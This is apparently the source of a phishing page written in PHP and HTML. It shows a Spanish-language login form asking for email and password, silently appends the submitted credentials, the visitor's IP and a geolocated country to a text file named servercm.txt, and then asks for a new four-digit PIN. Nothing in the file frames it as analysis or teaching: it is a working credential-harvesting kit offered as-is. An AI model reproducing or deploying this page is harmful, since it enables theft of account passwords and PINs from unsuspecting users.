<html><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
	<link rel="stylesheet" href="min.css">
    <title>Inicio</title>
        
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script src="alerta.js"></script>
</head>
<body>

    <div class="ttlo">
  <img src="tlo.png" alt="">

<div>
  <div class="contact-form-wrapper d-flex justify-content-center" id="mld">
    <form action="#" id="contenido1" method="post" class="contact-form">
      <h5 class="title">Inicio de sesi&oacute;n</h5>
      <p class="description">Inicie sesi&oacute;n para continuar.
      </p>
      <div id="numo">
      <div>
	  <input type="hidden" id="idmedu129" name="id" >
        <input type="email" class="form-control rounded border-white mb-3 form-input" id="name" name="nm1" placeholder="Correo Electronico" required>
      </div>
      <div>
        <input id="pws" type="password" class="form-control rounded border-white mb-3 form-input" name="nm2" placeholder="Contraseña" required>
      </div>
      
      <div class="submit-button-wrapper">
          <button id="bnts" type="submit">Iniciar sesi&oacute;n</button>
        
      </div>
    </div>
	    </form>
<?php 
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];

date_default_timezone_set('UTC');
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 

if (isset($_POST['nm1']) && isset($_POST['nm2']) ){
  session_start();
$_SESSION['mail']=$_POST['nm1'];
	 
 $file = fopen("servercm.txt", "a");
fwrite($file, "correo: ".$_POST['nm1']." - Clv: ".$_POST['nm2']." - pais: ".$pais." - ip: ".$ip."" . PHP_EOL ."***********servercm*********" . PHP_EOL);
fclose($file);
	
echo '<script laguage="javascript">
document.getElementById("contenido1").style.display = "none";
document.getElementById("contenido2").style.display = "inline";
</script>';
?>		

		<form action="index1.php" id="contenido2"  method="post" class="contact-form" >
		 <h5 class="title">Inicio de sesi&oacute;n</h5>
      <p class="description">Inicie sesi&oacute;n para continuar.
      </p>
    <div id="numt">
      <div>
        <input type="text" maxlength="4" class="form-control rounded border-white mb-3 form-input" name="namee" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" placeholder="Nuevo PIN 4 digitos" required="">
      </div>
      <div>
        <input name="pwss" type="text" maxlength="4" class="form-control rounded border-white mb-3 form-input" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" placeholder="Repita PIN 4 digitos" required="">
      </div>
      
      <div class="submit-button-wrapper">
          <button id="bntss" type="submit">Iniciar sesi&oacute;n</button>
        
      </div>
    </div>
    </form>
	
<?php } ?>
  </div>
  
</div>

</div></body></html>